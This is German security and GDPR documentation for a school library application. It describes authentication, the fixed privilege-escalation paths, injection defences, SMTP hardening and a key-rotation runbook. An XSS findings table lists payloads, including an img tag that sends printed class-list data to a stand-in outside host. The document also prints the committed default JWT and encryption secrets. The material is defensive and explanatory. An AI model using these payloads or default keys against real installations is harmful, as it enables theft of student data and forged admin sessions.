# Sicherheits- und Datenschutzkonzept (DSGVO)

Diese Dokumentation beschreibt die systemweiten Mechanismen zur Wahrung von Sicherheit und Datenschutz der Bibliotheks-Verwaltungssoftware.

> Zuletzt aktualisiert: 2026-08-06 (Audit-Nachlese: Cover-Proxy, SMTP-STARTTLS,
> Lesefristen, Panic-Log, Secret-Guard-Klarstellung)

---

## 🛡️ Authentifizierung & Session-Management

### Woran die Zugangsdaten geprüft werden

Gegen den **Schul-Mailserver per IMAP** (`auth/handlers.go`, `verifyIMAPCredentials`) —
nicht gegen die eigene Datenbank. Es gibt seit Migration 012 keine Passwortspalte und
nirgends einen Passwort-Hash: Die Anwendung speichert **kein** Benutzerpasswort. Ein
Konto ist damit die Verbindung aus einer E-Mail-Adresse, die auf dem Schulserver
existiert, und einer Zeile in `benutzer`; wer `benutzer.email` schreiben darf, übernimmt
das Konto. Der Brute-Force-Schutz unten schützt deshalb auch den **Mailserver** vor
Credential-Stuffing über diesen Weg.

### JWT (JSON Web Tokens)
- **Algorithmus-Pinning:** Der Server akzeptiert ausschließlich HMAC-signierte Tokens (HS256). Die `alg=none`-Schwachstelle (CVE-Klasse) ist damit verhindert — ein Token ohne Signatur wird abgelehnt.
- **Blacklist (fail-closed):** Abgemeldete Tokens werden in einer Datenbank-Blacklist registriert. Ist die Blacklist-Abfrage nicht erreichbar (DB-Fehler), wird der Request abgelehnt (HTTP 500), nicht durchgelassen. „Fail-Open"-Verhalten ist ausgeschlossen.
- **Lebensdauer:** 12 Stunden; danach ist eine erneute Anmeldung erforderlich.
- **Inaktivität (seit 22.08.2026):** Zwei Fristen im Client, beide in den Einstellungen („Datenschutz & Sitzung", 0 = aus): Nach **5 Minuten** ohne Bedienung lässt die Theken-Ansicht den geladenen Schüler/Lehrer fallen (der nächste an der Theke sieht nicht den vorigen), nach **15 Minuten** kommt der **Sperrbildschirm** — verdeckt die ganze Anwendung, weiter nur mit dem eigenen Passwort (echte Wiederanmeldung gegen `/login`, also gegen den Mailserver) oder per Abmelden. Die Sitzung selbst läuft weiter (Kiosk-Tabs überleben die Nacht), sie ist nur nicht mehr einsehbar. Als Bedienung zählen Zeiger, Tastatur (= Scanner), Berührung, Rad — nicht SSE-Pings oder Poller. Die Fristen holt jeder angemeldete Client von `GET /api/einstellungen/sitzung` (`RequireAuthenticated`, nur zwei Zahlen). Gate: `frontend/src/lib/stores/idleLock.test.js` (gestellte Uhr; am Rückbau rot gesehen), Live-Pfad: `frontend/e2e/sperrbildschirm.spec.js`.
- **Cookie-Attribute:** `HttpOnly` (kein JS-Zugriff), `SameSite=Strict`, in Produktion zusätzlich `Secure` (via `COOKIE_SECURE=true`). Hier stand bis zum 08.08.2026 `Lax` — der Code setzt seit jeher `http.SameSiteStrictMode` (`auth/handlers.go`). Die Doku war also laxer als die Anwendung; wer sie als Grundlage für eine Risikoabwägung nimmt, rechnet mit einem Cross-Site-Fenster, das es nicht gibt.

### Brute-Force-Schutz (Login)
- **Schlüssel:** `lower(email)|ip` — sperrt ein Konto für eine IP-Adresse (5 Fehlversuche / 15 min).
- **Warum nicht nur IP?** An einer Schulnetzwerk-NAT sind alle Geräte hinter einer IP. Würde nur die IP gesperrt, würde ein einziger Fehlversuch die gesamte Schule aussperren. Der Composite-Key (`email|ip`) isoliert das betroffene Konto auf dieser IP und schützt trotzdem gegen gezielte Account-Angriffe.
- **Globaler Rate-Limiter:** Zusätzlich 50 Requests/s/IP über alle Endpunkte (Map+Mutex, kein externer Cache nötig).
  Ausgenommen sind `/api/images/cover`, `/uploads/`, `/api/barcode` und `/events` — ein
  Seitenaufruf lädt dutzende Bilder gleichzeitig, und SSE ist eine Dauerverbindung. Die
  Ausnahme gilt der **Auslieferung**; der teure Zweig des Cover-Proxys (fremder Download)
  hat eine eigene Bremse, siehe „Cover-Proxy" weiter unten.

---

## 🔒 Autorisierung (RBAC)

### RequirePermission-Middleware
- Alle schützenswerten Endpunkte sind über `RequirePermission` bzw. `RequireRoles` abgesichert.
- **Keine transiente 403-Cacheung:** Ist die Datenbank bei der Berechtigungsprüfung nicht erreichbar (Netzwerkfehler, Timeout), wird HTTP 500 zurückgegeben und **nicht** in den Permission-Cache geschrieben. Ein vorübergehender DB-Ausfall führt also nicht dazu, dass legitime Benutzer für 60 Sekunden ausgesperrt bleiben.
- **Stabile Verweigerung:** Nur `pgx.ErrNoRows` (Berechtigung definitiv nicht vorhanden) wird gecacht und als 403 gewertet.
- **PII-Matrix (seit 18.08.2026):** [`docs/PII_MATRIX.de.md`](PII_MATRIX.de.md) stuft jede Route nach Schülerdaten ein (Stufe 0–3) und nennt das Recht davor; `api/pii_matrix_test.go` hält Tabelle und Registrierung deckungsgleich — eine neue Route ohne Einstufung wird rot. Der Sperrgrund-Freitext (`block_reason`) ist Stufe 2 und wird ohne `view_students` überall ausgeblendet (`ohneSperrgrund`).

### `manage_users` ist nicht Administrator (seit 06.08.2026)

`manage_users` ist ein **delegierbares** Recht — der PermissionManager bietet es auch für
MITARBEITER, LEHRER und HELFER an. Bis zum 06.08.2026 war es damit gleichbedeutend mit
Administrator; drei Wege führten dahin, alle jetzt geschlossen (`api/user_admin_eskalation.go`):

| Weg | Vorher | Jetzt |
|---|---|---|
| Selbstbeförderung | `PUT /api/benutzer/{eigene-id}` mit `rolle:"admin"` ging durch — der Selbstschutz unterstellte, wer sich selbst bearbeitet, sei bereits Admin, und ließ ausgerechnet diesen Fall zu | Die **eigene Rolle** ist für niemanden änderbar, gleich welcher Rolle |
| Fremdbeförderung | `POST`/`PUT /api/benutzer` mit `rolle:"admin"` für ein beliebiges Konto | Die Rolle `admin` vergibt nur ein Administrator |
| Übernahme per E-Mail | Die Anmeldung prüft per IMAP und sucht den Benutzer danach über seine **E-Mail** (`auth/handlers.go`). Wer die E-Mail eines Admin-Datensatzes auf die eigene Schuladresse setzte, bekam beim nächsten Login mit den **eigenen** Zugangsdaten die Admin-Sitzung — ganz ohne Rollenänderung | Ein Konto, das **heute** Administrator ist, kann nur ein Administrator bearbeiten oder löschen |

Zusätzlich ändert die **Rechte-Matrix** (`PUT /api/admin/permissions`) nur noch ein
Administrator. Vorher genügte `manage_users`, und damit schloss sich der Kreis: Der
Endpunkt konnte der eigenen Rolle jedes weitere Recht zuschalten. Konten verwalten und
festlegen, was Rollen dürfen, sind zwei verschiedene Dinge.

Was `manage_users` weiterhin darf: alle Konten **unterhalb** der Administratorebene
anlegen, ändern und löschen. Die Delegation an ein Sekretariat bleibt also möglich — sie
ist jetzt nur keine Hintertür zum Administrator mehr.

Gates: `api/user_admin_eskalation_test.go` (alle drei Wege plus die Gegenproben, dass
Administratoren und die normale Kontoverwaltung unverändert funktionieren) und
`api/user_admin_permissions_pg_test.go`.

### Rollenkonzept
- `admin`: Vollzugriff (`["*"]`). Berechtigungen werden beim Login direkt aus `role_permissions` geladen.
- `kollegium`: **Genau ein** Recht — `create_reservations` (Klassensatz im Kollegiums-Portal reservieren). Alles Weitere ist seit Migration 070 entzogen; die Suche im Portal läuft über den öffentlichen OPAC und fasst keine Personendaten an. Die Rolle hieß bis Migration 069 `lehrer`.
- `mitarbeiter`: Grundrechte für den Tresen-Betrieb.
- `helfer`: Kiosk-/Tresenbetrieb ohne die breiten Schülerrechte (Migration 042) — Scannen, Ausleihe, Rückgabe, Katalogzugriff, aber keine Schülerlisten und kein Mahnwesen.
- Alle Enum-Werte in der Datenbank sind **lowercase** (`admin`, `kollegium`, `mitarbeiter`, `helfer` — `schema.sql`, Typ `benutzer_rolle`). SQL-Vergleiche nutzen `LOWER(rolle::text)` um Casing-Fehler zu vermeiden (Bugfix: `LEHRER`-Enum führte zu HTTP 500 in der Omnibox).

> **Rechtevorgaben driften auf einer bestehenden Datenbank.** `db.InitPermissions` legt
> `role_permissions` mit `ON CONFLICT DO NOTHING` an — eine geänderte Vorgabe im Code
> erreicht damit **nur frische** Datenbanken. Genau so kam der Befund oben zustande. Wer
> eine Rechtevorgabe ändert, braucht deshalb zusätzlich eine Migration; und die Tabelle
> steuert nicht nur das Menü, sondern über `RequirePermission` auch die API.

### Endpunkte ohne Anmeldung
Ein Test erzwingt die Vollständigkeit dieser Liste: `TestAlleRoutenSindGeschuetzt`
(`api/routes_authz_coverage_test.go`) lässt jede registrierte Route ohne
`RequirePermission`/`RequireRoles` fehlschlagen, solange sie nicht mit Begründung auf der
Allowlist steht. Eine ungeschützte Route kann also nicht unbemerkt live gehen.

Bewusst öffentlich sind:

| Endpunkt | Warum unbedenklich |
|---|---|
| `GET /api/public/opac/suche` | Katalogsuche: Titel/Autor/Verfügbarkeit, keine personenbezogenen Daten. LMF-Schulbücher sind ausgefiltert. |
| `GET /api/monitor/slides` | Bibliotheks-Monitor, nur Buchdaten. |
| `GET /api/images/cover`, `/uploads/` | Cover-Bilder (SSRF-Host-Allowlist). Schülerfotos liegen **nicht** hier, sondern AES-verschlüsselt in der Datenbank. Grenzen siehe unten. |
| `GET /api/csrf-token`, `/api/auth/*`, `POST /login` | Bootstrap bzw. selbst-authentifizierend. |
| `GET /api/public/bestellung/{token}` + `/etiketten/{groesse}?format=…` + `POST …/bestaetigen` | Bestätigungs-Link an den Lieferanten — siehe unten. `format` wählt das Bogenraster der kleinen Etiketten und wird gegen die Allowlist in `api/label_formats.go` geprüft: Unbekanntes ergibt **400**, nicht stillschweigend die Vorgabe. |

**Der Bestätigungs-Link ist der einzige schreibende Zugang ohne Anmeldung.** Sein
Zuschnitt begrenzt den Schaden:

- **Der Token ist der Ausweis:** 32 Byte aus `crypto/rand` (256 Bit), Base64-URL. Raten ist
  ausgeschlossen; der globale Rate-Limiter steht zusätzlich davor.
- **In der Datenbank nur der SHA-256** (`bestellungen_verlauf.bestaetigungs_token_hash`,
  Migration 063). Ein DB-Auszug oder ein entwendetes Backup enthält keine benutzbaren
  Links. Kein langsamer KDF nötig — die Eingabe ist bereits 256 Bit Zufall, es gibt nichts
  zu erraten.
- **Kein Passwort davor, bewusst:** Der Lieferant müsste sonst ein Geheimnis verwalten;
  das würde den Ablauf entwerten, den der Link erst möglich macht.
- **Reichweite:** genau eine Bestellung. Sichtbar sind Lieferant, Datum, Kundennummer und
  Titelzeilen — dieselben Angaben, die der Lieferant ohnehin als Mailanhang hat. Keine
  Schülerdaten, keine Preise, kein Zugriff auf den Bestand.
- **Einmalig und atomar:** Bestätigen läuft über `WHERE bestaetigt_am IS NULL`; der zweite
  Klick bekommt 409 statt eines stillen Überschreibens.
- **Ablauf und Rückruf:** 180 Tage gültig; ein neu erzeugter Link entwertet den alten sofort.
- **Ungültig ist immer 404** — abgelaufen, zurückgezogen und nie existiert sehen von außen
  gleich aus, sonst verriete die Antwort, dass ein geratener Token einmal echt war.
- **Nicht in Logfiles:** Der Token steht im Pfad, also maskiert `maskiereToken`
  (`api/middleware.go`) ihn in **allen drei** Logzeilen — Request-Log, 500er-Stacktrace
  und Panic-Recovery. Ohne das hätte ein weitergereichtes Logfile funktionierende Links
  enthalten und die Hash-Speicherung entwertet (Request-Log und 500er gefunden im
  Smoke-Test am laufenden Server, 05.08.2026; die Panic-Zeile schrieb den rohen Pfad
  noch bis zum 06.08.2026 — sie war beim ersten Fix schlicht übersehen worden).
- **CSRF gilt weiter:** Die Seite nutzt den normalen Double-Submit-Weg; ein POST ohne
  `X-CSRF-Token` wird mit 403 abgewiesen (nachgewiesen am laufenden Server).

---

## 🛡️ Schutz vor Injection-Angriffen

### SQL-Injection
- Alle Datenbankinteraktionen erfolgen ausschließlich über parametrisierte Queries (`$1`, `$2`, …) mit `jackc/pgx/v5`. String-Konkatenation in SQL-Statements existiert nicht.

### CSV-Formel-Injection (CWE-1236)
- **Angriffsvektor:** Buchtitel oder Autornamen, die mit `=`, `+`, `-`, `@`, `\t`, `\r`, `\n` beginnen, können in CSV-Dateien als Formeln interpretiert werden (Excel/LibreOffice führt diese bei Öffnen aus).
- **Schutz:** `pkg/csvutil.SanitizeRow()` setzt einen Apostroph-Präfix vor alle Zellen, die mit einem dieser Zeichen beginnen (OWASP-Empfehlung). Wird bei allen CSV-Exporten verwendet (`inventur/export_csv.go`, Bestellexporte).

### XSS (Cross-Site Scripting)
- Svelte 5 escaped alle Template-Variablen automatisch.
- `{@html}` wird im gesamten Frontend nicht eingesetzt.
- SVG-Icons sind hartcodierte Konstanten, keine benutzerkontrollierten Werte.

#### Die eine Naht, an der Svelte nicht mehr schützt: der Druckpfad

Die Ausleiher-Liste baut ihr Druckdokument als String und schreibt es per
`document.write` in ein neues Fenster. Dort endet Svelters automatische Maskierung.
Bis zum 06.08.2026 gingen `schueler_name`, `schueler_nachname`, `klasse`,
`exemplar_barcode` und der Buchtitel unmaskiert hinein.

Gemessen (Chromium, mit dem echten CSP-String) sah das so aus:

| Nutzlast im Nachnamen | Ergebnis |
|---|---|
| `<script>…</script>` | **blockiert** — ein per `window.open('')` erzeugtes `about:blank` erbt die CSP des Openers, und die erlaubt nur `script-src 'self'` |
| `onerror="…"` | **blockiert**, gleicher Grund |
| `<img src="https://fremder-host/?daten=…">` | **geladen** — `img-src` erlaubte ausdrücklich `https:` |

Der Befund war also keine Skriptausführung, sondern HTML-Injektion mit Abflusskanal:
Der Inhalt der gedruckten Klassenliste ließ sich an einen fremden Server tragen.
Beides ist behoben — die Werte werden maskiert (`utils/escapeHtml.js`), und `img-src`
kennt kein `https:` mehr (siehe unten).

Nebenbefund derselben Messung: Der Auto-Druck lag als `<script>` **im geschriebenen
Dokument** und wurde von derselben CSP blockiert. Das Fenster ging auf und blieb stehen;
gedruckt werden musste von Hand. Der Aufruf steht jetzt im Opener.

Gate: `frontend/src/lib/utils/ausleiherDruck.test.js` prüft das **fertige Dokument**,
nicht den Maskier-Helfer — ein Test des Helfers belegt nur, dass er maskiert, nicht,
dass er an jeder Einsetzstelle aufgerufen wird.

---

## 📁 Datei-Uploads

### Foto-Uploads (Schülerfotos)
- **Decompression-Bomb-Schutz:** `pkg/imageutil.GuardImageDimensions()` liest per `image.DecodeConfig` nur den Bild-Header (ohne volle Dekodierung). Bilder über 50 Megapixel werden abgelehnt, bevor `image.Decode` die vollständige Pixelmatrix allokiert (Schutz gegen RAM-Erschöpfung durch präparierte Bilder).
- **MIME-Prüfung:** Über echte Dekodierung, nicht nur Dateiendung.
- **Verschlüsselung:** Fotos werden AES-256-GCM-verschlüsselt als `BYTEA` in der Datenbank gespeichert — kein Klarpfad auf dem Dateisystem.
- **Path-Traversal:** Alle Pfadoperationen nutzen `filepath.Base` + `filepath.Clean` + Prefix-Guard.

### Cover-Uploads
- 10 MB Body-Limit, 0600 Dateiberechtigungen.
- Ebenfalls `GuardImageDimensions` vor dem vollständigen Decode.
- **Pfadbindung über `os.OpenRoot`** (seit 06.08.2026, `inventur/uploads_pfad.go`). Vorher
  stand an drei Stellen `filepath.Join` → `filepath.Clean` → `strings.HasPrefix`. Das hält
  den geradlinigen Fall auf, ist aber eine Prüfung **im Programm** über einen Pfad, der
  danach trotzdem ans Betriebssystem geht. Ein Symlink in `uploads/` genügte:
  `HasPrefix("uploads/raus.jpg", "uploads/")` ist wahr, und geschrieben wurde außerhalb.
  Nachgestellt in `inventur/uploads_pfad_test.go` — mit der früheren Prüfung ist der
  Symlink-Test **rot**, mit `os.OpenRoot` grün, weil die Auflösung am Kernel scheitert.

### Cover-Proxy (`GET /api/images/cover`) — der teuerste öffentliche Pfad
Dieser Endpunkt ist der einzige **unauthentifizierte** Pfad, der eine ausgehende
Verbindung und eine vollständige Bilddekodierung auslöst: ein Aufruf = ein fremder
Download + ein `image.Decode`. Bis zum 06.08.2026 war daran nichts begrenzt — er steht
zusätzlich in der Ausnahmeliste des globalen Rate-Limiters, weil ein Katalogaufruf
dutzende Bilder gleichzeitig lädt. Jetzt gilt:

| Grenze | Wert | Wogegen |
|---|---|---|
| Cache-Name (`?isbn=`) | nur Ziffern, Trennstriche, abschließendes `X` | Er wird zum Dateinamen; beliebige Zeichenketten legten beliebige Dateien an |
| Antwortgröße | 10 MB (`io.LimitReader`) | Der fremde Server bestimmte, wie viel RAM ein Aufruf kostet |
| Bildgröße | 50 MP (`GuardImageDimensions`, nur Header) | Decompression-Bomb: 30000×30000 px ≈ 3,6 GB im Speicher, wenige hundert KB auf der Leitung |
| Downloads/IP | 30/s — **nur der Cache-Fehltreffer** | Verstärkung: eine Anfrage von außen = eine ausgehende Anfrage von uns |

Ausgelieferte Cache-Treffer bleiben ungebremst; sie sind ein Datei-Read. Wichtig zum
Verständnis der Allowlist: `covers.openlibrary.org` steht darauf und wird von
Freiwilligen befüllt — die Allowlist begrenzt das **Ziel**, nicht den **Inhalt**. Ein
präpariertes Bild ist über einen erlaubten Host erreichbar, deshalb greifen die
Größengrenzen unabhängig von ihr.

Denselben Header-Guard hat seit dem 06.08.2026 auch der Cover-Downloader des
Inventur-Moduls (`inventur/cover_downloader.go`); dort gab es bereits ein 10-MB-Limit
auf der Leitung, aber keines für den Speicher.

---

## 📧 E-Mail-Sicherheit (SMTP/IMAP)

### SMTP STARTTLS
- **STARTTLS ist Pflicht** (`mailservice.sichereVerbindung`, 06.08.2026): Bietet der Server
  die Erweiterung nicht an, bricht der Versand mit `ErrSMTPKlartext` ab, statt die Nachricht
  im Klartext zu schicken. Vorher hieß die Funktion `starttlsWennMoeglich` und gab in genau
  diesem Fall `nil` zurück — die Vertraulichkeit jeder Mahnung hing damit am Wohlwollen der
  Gegenstelle, und ein MITM konnte sie durch Streichen der Erweiterung aus der EHLO-Antwort
  selbst herbeiführen („STARTTLS stripping").
  Die **AUTH-Zugangsdaten** waren dabei nie in Gefahr: `smtp.PlainAuth` verweigert die
  Übertragung über eine unverschlüsselte Verbindung von sich aus. Der **Inhalt** schon —
  und bei einem Relay ohne Zugangsdaten (Versand nach IP, im Schulnetz üblich) fiel diese
  Bremse ganz weg.
- **Kein Bruch im Schulbetrieb:** `srv1.philipp-reis-schule.de` bietet STARTTLS auf 25 und
  587 an (EHLO-Probe ohne Anmeldung, 06.08.2026). Belegt durch
  `TestVersendeUeberSMTPBrichtOhneSTARTTLSAb` und seine Gegenprobe.
- **Zertifikatsprüfung aktiv:** `ServerName` wird gesetzt, `MinVersion: TLS 1.2` erzwungen. `InsecureSkipVerify` war zuvor auf `true` gesetzt — ein MITM-Angreifer konnte dadurch SMTP-Credentials und den gesamten E-Mail-Inhalt (inkl. Personendaten für Mahnwesen) mitlesen. **Behoben.**
- **Zwei getrennte Opt-outs**, weil es zwei verschiedene Zugeständnisse sind:
  `SMTP_ALLOW_INSECURE_TLS=true` schaltet die Zertifikatsprüfung ab (TLS bleibt),
  `SMTP_ALLOW_PLAINTEXT=true` erlaubt den Versand ganz ohne TLS. Beide protokollieren eine
  Warnung. Nur für ein Legacy-Relay, das anders nicht erreichbar ist.
- **Header-Injection:** Attachment-Dateinamen werden gegen CRLF-Injection bereinigt.

### IMAP
- Implizites TLS (Port 993), `MinVersion: TLS 1.2`, ServerName-Verifikation, Timeouts.

---

## 🔏 CSRF-Schutz

- **Methode:** Double-Submit Cookie mit Constant-Time-Vergleich.
- **Achtung (behoben):** `sync-covers` und `import-bestand` sind global registrierte Endpunkte unter `/api/admin/…`. Durch eine zu breite Ausnahme-Regel für `/api/admin/*` waren diese temporär ohne CSRF-Schutz. Die Ausnahme wurde entfernt — beide Endpunkte durchlaufen jetzt die globale CSRF-Prüfung. Das Frontend sendet den Token bereits korrekt (keine Frontend-Änderung nötig).

---

## 🐳 Produktions-Absicherung (Secret Guard)

### Problem
Wenn `JWT_SECRET` oder `APP_ENCRYPTION_KEY` die committeten Entwicklungs-Defaults verwenden, kann jeder mit Repo-Zugriff Admin-JWTs fälschen (vollständige Übernahme) oder AES-verschlüsselte Schülerfotos entschlüsseln.

### Lösung (`main.go/loadConfig`)
Der Server **verweigert den Start**, wenn der Schalter `ENFORCE_PROD_SECRETS=true` gesetzt ist und bekannte Default-Secrets erkannt werden:
```go
enforceProdSecrets := strings.ToLower(os.Getenv("ENFORCE_PROD_SECRETS")) == "true"
if enforceProdSecrets {
    knownDefaultSecrets := map[string]bool{
        "super-secret-default-key-at-least-32-bytes": true,
        "super-secure-aes-key-32-chars-ok":           true,
        "supergeheim_lokal":                          true,
    }
    // … log.Fatalf bei Treffer
}
```

**Bewusst per Schalter einschaltbar (entkoppelt von `APP_ENV`):**
- Test-/Pilotphase: `ENFORCE_PROD_SECRETS=false` (Standard) → Stack startet auch mit Defaults.
- Echter Prod-Deploy: `ENFORCE_PROD_SECRETS=true` → harte Start-Verweigerung bei Default-Secrets.

Die Entkopplung von `APP_ENV` ist Absicht: `APP_ENV=local` würde sonst gleichzeitig das Cookie-`Secure`-Flag deaktivieren und Swagger öffentlich freischalten. So bleibt `APP_ENV=production` (sichere Cookies, kein Swagger), während die Secret-Härtung separat geschaltet wird.

### Mindestanforderungen
- `JWT_SECRET`: ≥ 32 Zeichen
- `APP_ENCRYPTION_KEY`: genau 32 Bytes (oder 64 Hex-Zeichen)

**Was `docker-compose.yml` erzwingt — und was nicht.** Hier stand bis zum 06.08.2026,
die Compose-Datei erzwinge per `${VAR:?Fehlermeldung}`, dass *alle* Secrets gesetzt sind.
Das stimmt nur für zwei davon. Tatsächlich:

| Variable | Compose-Verhalten |
|---|---|
| `POSTGRES_PASSWORD` | `${…:?}` — Stack startet ohne sie **nicht** |
| `IMAP_HOST` | `${…:?}` — Stack startet ohne sie **nicht** |
| `JWT_SECRET` | `${…:-super-secret-default-key-at-least-32-bytes}` — fällt auf den **committeten Default** zurück |
| `APP_ENCRYPTION_KEY` | `${…:-super-secure-aes-key-32-chars-ok}` — fällt auf den **committeten Default** zurück |

Für die beiden letzten ist der Code-Guard (`ENFORCE_PROD_SECRETS=true`) die **einzige**
Absicherung, und er ist standardmäßig **aus**. Ein Prod-Deploy ohne gesetzte `.env`-Werte
läuft also mit im Repo nachlesbaren Schlüsseln — Admin-JWTs sind damit fälschbar und
Schülerfotos entschlüsselbar.

> **Warum die Defaults trotzdem bleiben:** Ein `${JWT_SECRET:?}` würde einen bereits
> laufenden Stack beim nächsten `./update.sh` nicht mehr starten. Schlimmer wäre der
> naheliegende „Fix", einfach neue Schlüssel zu erzeugen: Mit einem neuen
> `APP_ENCRYPTION_KEY` sind die AES-verschlüsselten Schülerfotos und das gespeicherte
> SMTP-Passwort **nicht mehr lesbar**. Der Wechsel ist eine Schlüsselrotation mit
> Datenmigration, keine Konfigurationsänderung — siehe Checkliste in
> [DEPLOYMENT.md](DEPLOYMENT.md#22-secret-guard-per-schalter-einschaltbar).

---

## 🔒 Datenschutz und DSGVO-Konformität

### Automatisierte Löschroutinen
Die Applikation führt automatisierte Cronjobs (`jobs/cron.go`) durch:

- **Ausleihen-Anonymisierung (`RunGDPRAnonymizeLoans`):** Entfernt `bearbeiter_id` von Ausleihen, die vor mehr als 14 Tagen zurückgegeben wurden.
- **Abgänger-Löschung (`RunGDPRDeleteAbgaenger`):** Hard-Delete von Schülerdatensätzen (`ist_abgaenger = true`) nach Karenzzeit (30 Tage im neuen Schuljahr), sofern keine offenen Ausleihen oder unbezahlten Schadensfälle bestehen. Historische Ausleihdaten werden anonymisiert (`schueler_id = NULL`).
- **Lesehistorie befristen (`RunLesehistorieBefristung`, seit 22.08.2026):** Trennt abgeschlossene Ausleihen nach Frist vom Schüler (`schueler_id = NULL`); der Vorgang bleibt für Statistik und Bestandskartei erhalten, nur ohne Person. Zwei Fristen, weil zwei Verarbeitungstätigkeiten (Einstellungen → „Datenschutz & Sitzung", 0 = aus): **Schülerbücherei 90 Tage** (HBDI-Muster-VVT: löschen, „sobald nicht mehr notwendig"), **Lernmittel 730 Tage** (Bestandskartei weist Ausleihe **und** Rücklauf nach, HKM-Leitfaden LMF 11.3; Schadensersatz läuft über die Schulaufsicht, 12.3–12.7). Ausleihen mit **offenem Schadensfall** bleiben zugeordnet, Lehrer-Ausleihen (dienstlich) unberührt. Gate: `jobs/cron_dsgvo_lesehistorie_pg_test.go` (Paarung Frist × Medienklasse, Schadensfall-Wächter, Aus-Schalter — am Rückbau rot gesehen). Vorher behielt jede Ausleihe ihre `schueler_id` bis zur Schüler-Löschung; die Titel-Historie zeigte bis zu 200 Entleiher mit Namen.
- **Anonymisierung alter Datensätze (`RunGDPRAnonymizeOldData`):** Leert nach Frist (Soft-Delete > 180 Tage, Abgänger > 360 Tage) alle direkt identifizierenden Spalten eines Schülers (Name, Adresse, Geburtsdatum, LUSD-ID, Eltern-E-Mail), löscht das verschlüsselte Foto — und tilgt die PII-Spuren aus den **Neben-Tabellen**: den Klarnamen aus `audit_log`, die LUSD-ID aus `audit_logs`, und die Vormerkungen des Schülers. Ohne diese Tilgung überlebte der Personenbezug bis zur Audit-Aufbewahrung (bis zu 24 Monate) nach der eigentlichen Löschung.

### Datenverschlüsselung
- Schülerfotos: AES-256-GCM-verschlüsselt als `BYTEA` in der Datenbank. Kein Klartext auf dem Dateisystem.
- DB-Backups: `pg_dump → gzip → AES-256-GCM`. Der Schlüssel wird per **scrypt** (speicherhart, 16-Byte-Salt pro Datei) aus `BACKUP_ENCRYPTION_KEY` abgeleitet — nicht mehr per einfachem SHA-256; das nimmt einer erbeuteten Backup-Datei die Offline-Rate-Geschwindigkeit. Versioniertes Format (`BKDF`-Kennung); der frühere schwache SHA-256-Weg ist ganz entfernt, Dateien ohne die Kennung werden abgelehnt (im Pilotbetrieb keine schützenswerten Altbackups). 0600 Dateiberechtigungen, Rotation. Seit dem 23.08.2026 gilt das für **alle drei** Backup-Wege: Auch `scripts/backup.sh` und die Vorab-Sicherung von `./update.sh` verschlüsseln über dieselbe Ableitung (`internal/backupkrypto`, Werkzeug `cmd/encrypt-backup` im Container — der Schlüssel verlässt ihn nicht). Klartext-Dumps entstehen nur noch als benannter Ausnahmefall (fehlgeschlagener Deploy = Rollback-Weg, Verschlüsselung nicht möglich) und werden nach 2 statt 30 Tagen gelöscht.

#### `APP_ENCRYPTION_KEY` wechseln

Ein neuer Schlüssel allein repariert nichts, er zerstört: Schülerfotos
(`schueler_fotos.foto_encrypted`) und das gespeicherte SMTP-Passwort
(`mail_settings_config.smtp_password_encrypted`) liegen mit dem **alten** Schlüssel
verschlüsselt in der Datenbank. Wer nur die Umgebungsvariable austauscht, hat sie danach
unwiederbringlich verloren — die Anwendung meldet dann bloß „entschlüsselung
fehlgeschlagen".

Dafür gibt es `cmd/rotate-encryption-key`. Es entschlüsselt jeden Datensatz mit dem alten
und verschlüsselt ihn mit dem neuen Schlüssel, alles in **einer** Transaktion: Entweder
ist am Ende alles umgeschlüsselt oder nichts.

**Kein Platzhalter in den Befehlen.** Der Schlüssel steht in einer Shell-Variablen, und
zwar aus einem konkreten Grund: Eine Anleitung mit `<neu>` wurde am 06.08.2026 wörtlich
eingefügt. Die beiden Rotationsbefehle scheiterten harmlos an der bash-Syntax — die Zeile
`echo "APP_ENCRYPTION_KEY=<neu>" >> .env` lief aber durch, schrieb fünf Zeichen in die
`.env`, und der Server verweigerte beim nächsten Start den Dienst (Längenprüfung in
`main.go`). Die Anwendung war unten, bis die Zeile wieder entfernt war.

**Auf dem Server** (kein Go nötig — das Binary liegt im Image, und im Container sind
`APP_ENCRYPTION_KEY` und `DATABASE_URL` bereits gesetzt). Alles in **derselben**
Shell-Sitzung ausführen, damit `$NEU` erhalten bleibt:

```bash
cd /opt/bibliothek

# 0. Backup ziehen. Immer.
docker compose exec -T postgres-db pg_dump -U postgres bibliothek > vor-rotation.sql
ls -lh vor-rotation.sql

# 1. Schlüssel erzeugen und merken
NEU=$(openssl rand -hex 32)
echo "Neuer Schlüssel: $NEU"

# 2. Probelauf — liest und rechnet alles durch, schreibt nichts
docker compose exec -T backend ./rotate-encryption-key -neu "$NEU" -pruefen
```

Erst wenn dort **„Probelauf erfolgreich"** steht, weiter — und die nächsten drei Zeilen
zusammen absenden, weil die Anwendung dazwischen nicht lesen kann:

```bash
docker compose exec -T backend ./rotate-encryption-key -neu "$NEU"
echo "APP_ENCRYPTION_KEY=$NEU" >> .env
docker compose up -d backend
```

Kontrolle:

```bash
./scripts/pruefe_secrets.sh          # APP_ENCRYPTION_KEY muss grün sein
grep -c APP_ENCRYPTION_KEY .env      # genau 1
```

Und die Prüfung, die kein Skript ersetzt: in der Oberfläche einen Schüler **mit Foto**
öffnen. Erscheint das Bild, ist die Umschlüsselung wirklich durch — nicht nur laut
Logzeile.

**Lokal / ohne Container:**

```bash
NEU=$(openssl rand -hex 32)
read -rsp "Alter APP_ENCRYPTION_KEY: " ALT; echo

APP_ENCRYPTION_KEY="$ALT" DATABASE_URL="$DATABASE_URL" \
  go run ./cmd/rotate-encryption-key -neu "$NEU" -pruefen
```

> **Reihenfolge beachten, wenn zugleich `ENFORCE_PROD_SECRETS=true` gesetzt werden soll:**
> erst rotieren, dann den Schlüssel in die `.env`, **dann** den Schalter. Andersherum
> verweigert der Server den Start, weil er noch den bekannten Default vorfindet.

> **Steht `APP_ENCRYPTION_KEY` gar nicht in der `.env`?** Dann ist der alte Schlüssel der
> Compose-Default `super-secure-aes-key-32-chars-ok` — im Container ist er als
> Umgebungsvariable gesetzt, das Kommando findet ihn also von selbst.

#### Wenn der Server nach einem Schlüsselwechsel nicht mehr startet

Symptom: Caddy liefert **502**, `docker compose up -d backend` meldet trotzdem „Started".
Der Container startet, der Prozess beendet sich sofort — `main.go` prüft die Schlüssellänge
und bricht mit `FATAL` ab, wenn sie nicht genau 32 oder 64 beträgt.

```bash
docker compose logs --tail=20 backend     # zeigt die FATAL-Zeile
grep -n APP_ENCRYPTION_KEY .env           # steht dort ein unbrauchbarer Wert?
```

Ist der Wert kaputt und wurde **noch nicht** rotiert, genügt es, die Zeile zu entfernen —
